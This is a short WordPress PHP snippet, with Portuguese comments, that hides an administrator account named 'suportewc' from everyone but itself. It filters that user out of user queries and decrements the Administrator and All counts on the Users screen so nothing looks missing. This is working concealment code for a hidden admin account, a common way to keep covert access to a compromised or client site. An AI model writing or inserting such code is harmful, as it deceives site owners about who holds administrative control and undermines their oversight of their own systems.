<?php 


add_action('pre_user_query','lf_esconde_administrador');
function lf_esconde_administrador( $u_query ) {
 

	// let's allow the hidden user to see himself
	$current_user = wp_get_current_user();
    
	if($current_user->data->user_login != 'suportewc'){ 
		global $wpdb;
		// just str_replace() the SQL query 
		$u_query->query_where = str_replace('WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.user_login != 'suportewc'", $u_query->query_where); // do not forget to change user ID here as well
	}
 
}






// retira o usuário da aba administradores
add_filter("views_users", "lf_esconde_administrador_aba");
function lf_esconde_administrador_aba($views){
   $users = count_users();
   $admins_num = $users['avail_roles']['administrator'] - 1;
   $all_num = $users['total_users'] - 1;
   $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
   $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
   return $views;
}
?>